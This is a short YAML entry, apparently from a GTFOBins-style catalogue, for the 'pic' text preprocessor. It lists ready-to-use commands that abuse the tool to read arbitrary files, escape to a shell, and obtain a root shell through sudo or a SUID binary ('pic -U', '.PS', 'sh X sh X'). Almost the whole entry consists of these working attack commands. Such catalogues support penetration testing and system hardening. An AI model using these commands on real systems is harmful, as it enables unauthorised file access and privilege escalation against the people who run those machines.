---
functions:
  file-read:
    - code: |
        LFILE=file_to_read
        pic $LFILE
  shell:
    - code: |
        pic -U
        .PS
        sh X sh X
  sudo:
    - code: |
        sudo pic -U
        .PS
        sh X sh X
  limited-suid:
    - code: |
        ./pic -U
        .PS
        sh X sh X
---
